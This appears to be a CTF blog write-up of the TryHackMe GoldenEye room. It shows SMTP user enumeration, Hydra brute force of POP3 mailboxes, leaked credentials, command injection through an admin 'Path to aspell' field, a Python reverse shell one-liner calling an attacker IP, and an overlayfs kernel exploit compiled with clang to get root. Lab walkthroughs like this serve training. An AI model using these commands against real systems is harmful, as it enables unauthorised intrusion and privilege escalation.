---
layout: post
mermaid: true
title: "GoldenEye"
date: 2026-07-04
categories: [ctf]
tags: [thm, pop3, email-enumeration, commandinjection, privesc, overlayfs]
---

## Overview

| | |
|---|---|
| **Platform** | TryHackMe |
| **Difficulty** | Medium |
| **URL** | <a href="https://tryhackme.com/room/goldeneye" target="_blank">https://tryhackme.com/room/goldeneye</a> |
| **Focus** | Credential harvesting through internal email, ending in an admin panel field that never expected to be treated as a command |

GoldenEye is a Bond-themed box that starts with a very ordinary-looking mail server and a website. Getting a foothold means treating the mailboxes as the actual attack surface instead of the web app in front of them — and the final way in isn't a known CVE, it's a configuration field nobody thought to validate.

---

## Reconnaissance

I start with a full port scan:

```bash
nmap -sS -sC -sV -O -n -Pn -p- <TARGET_IP> -oN nmap.txt

PORT      STATE SERVICE  VERSION
25/tcp    open  smtp     Postfix smtpd
80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
55006/tcp open  ssl/pop3 Dovecot pop3d
55007/tcp open  pop3     Dovecot pop3d
```

SMTP, a web server, and POP3 on two non-standard ports (one over SSL). There's no SSH exposed, which already tells me the intended path is through mail, not a shell service.

## Getting In

The website is a themed login page, but the real lead is in the client-side JavaScript:

```bash
curl -s http://<TARGET_IP>/terminal.js | grep -A 5 "password"

//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
```

That's HTML entity-encoded — decoding it gives me a plaintext password for a user called `boris`: `InvincibleHack3r`. I don't have anywhere to use it yet, but I do have SMTP:

```bash
nc <TARGET_IP> 25

220 ubuntu GoldentEye SMTP Electronic-Mail agent

VRFY boris
252 2.0.0 boris

VRFY natalya
252 2.0.0 natalya
```

`VRFY` confirms both `boris` and `natalya` are valid mailbox users. With boris's leaked password already in hand, I go straight for POP3.

## Email Harvesting: A Credential Cascade

This is where the room's real structure shows up — POP3 access to one mailbox leaks the password for the next.

```bash
hydra -l boris -P /usr/share/wordlists/fasttrack.txt pop3://<TARGET_IP>:55007

[55007][pop3] host: <TARGET_IP>   login: boris   password: secret1!
```

Boris's inbox is mostly noise, but one email mentions "Alec" and final codes stored somewhere on root — a hint I file away for later, not something to act on yet. What matters right now is that `natalya` also needs brute-forcing, since I don't have her password from anywhere else:

```bash
hydra -l natalya -P /usr/share/wordlists/fasttrack.txt pop3://<TARGET_IP>:55007

[55007][pop3] host: <TARGET_IP>   login: natalya   password: bird
```

Natalya's inbox has an email from root assigning a brand-new account:

```
username: xenia
password: RCP90rulez!

Internal domain: severnaya-station.com/gnocertdir
```

That's an internal hostname I haven't seen anywhere in the scan — I add it to `/etc/hosts` and hit it directly with xenia's credentials:

```bash
curl -u xenia:RCP90rulez! http://severnaya-station.com/gnocertdir/
```

Access granted to an internal portal. Browsing the user profiles here surfaces another username, `doak` — so the cascade continues. One more round of Hydra against POP3 (same command, different username) gets his mailbox open, and his email hands off credentials for yet another account, `dr_doak`.

Logging into the portal as `dr_doak` turns up a file, `s3cret.txt`, which points at an image: `/dir007key/for-007.jpg`.

Pulling the metadata off that image is the last hop in the chain:

```bash
exiftool /dir007key/for-007.jpg | grep -i description

Image Description: eFdpbnRlcjE5OTV4IQ==

echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d

xWinter1995x!
```

That decodes to the admin password. Four mailboxes, four hand-offs, and I've gone from an unauthenticated visitor to admin — without touching a single known exploit.

## Getting Admin: The Aspell Injection

The admin panel is a spell-check configuration screen, and this is the part of the room I actually enjoyed. There's a setting to pick the spell-check engine:

```bash
curl -u admin:xWinter1995x! "http://severnaya-station.com/gnocertdir/admin/settings.php?section=spellengine"
```

It's currently set to "Google Spell". Switching it to "PSpellShell" changes how the backend invokes the spell-checker — instead of an API call, it shells out to a local binary. And right next to that setting is another field:

```bash
curl -u admin:xWinter1995x! "http://severnaya-station.com/gnocertdir/admin/settings.php?section=systempaths"
```

"Path to aspell" — empty, and free text. Nothing here validates that this is actually a path to a binary. So I put a reverse shell one-liner in it instead:

```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<ATTACKER_IP>",<ATTACKER_PORT>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

It won't run until the spell-checker is actually triggered, so I create a new post in the portal, write some throwaway text, and click "Activate spelling" with a listener up:

```bash
nc -lvnp <ATTACKER_PORT>

listening on [any] <ATTACKER_PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [<TARGET_IP>] 39983
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Shell as `www-data`. The interesting part isn't the payload — it's that a config field meant to hold a filesystem path was trusted enough to get executed with zero validation.

## Breaking Out With overlayfs

`www-data` isn't the goal, so I check what I'm working with:

```bash
uname -a

Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

Kernel 3.13.0 is vulnerable to the overlayfs privilege escalation (CVE-2015-1328). I grab the public exploit and try to compile it the normal way, and immediately hit a wall — there's no `gcc` on this box. There is a `clang`, though, and the exploit's source only calls `gcc` by name, not by any actual gcc-specific feature:

```bash
cd /tmp

clang --version

Ubuntu clang version 3.4-1ubuntu3 (based on LLVM 3.4)

sed -i 's/gcc/clang/g' 37292.c

clang 37292.c -o exploit

37292.c:97:1: warning: control may reach end of non-void function [-Wreturn-type]
1 warning generated.
```

One warning, no errors. Running it:

```bash
./exploit

spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

Root.

---

## Attack Flow

<div class="mermaid">
graph TD
    A["Nmap scan<br/>SMTP, HTTP, POP3 exposed"] --> B["terminal.js<br/>HTML-entity encoded password"]
    B --> C["SMTP VRFY<br/>confirms boris, natalya"]
    C --> D["Hydra POP3 brute-force<br/>boris mailbox"]
    D --> E["Hydra POP3 brute-force<br/>natalya mailbox"]
    E --> F["Email leak<br/>xenia credentials + internal domain"]
    F --> G["Internal portal access<br/>doak found, mailbox cracked"]
    G --> H["Email leak<br/>dr_doak credentials"]
    H --> I["Portal file s3cret.txt<br/>points to JPEG"]
    I --> J["EXIF + base64 decode<br/>admin password"]
    J --> K["Admin panel<br/>PSpellShell engine switch"]
    K --> L["Unvalidated path field<br/>command injection"]
    L --> M["Reverse shell<br/>www-data"]
    M --> N["overlayfs exploit<br/>clang instead of gcc"]
    N --> O["Root shell"]
</div>

---

## Key Takeaways

**A "path" field is still an injection vector** — Any input that ends up being executed by the backend is dangerous, even if the UI frames it as a filesystem path rather than a command.

**Missing compiler doesn't mean blocked exploit** — If exploit source only references a compiler by name and not by compiler-specific behavior, swapping the name is often enough to get it running on whatever's available.

**Internal email is a lateral movement channel, not just information** — Each mailbox in this room existed purely to hand off the next credential, which is a realistic pattern in orgs with weak internal mail hygiene.
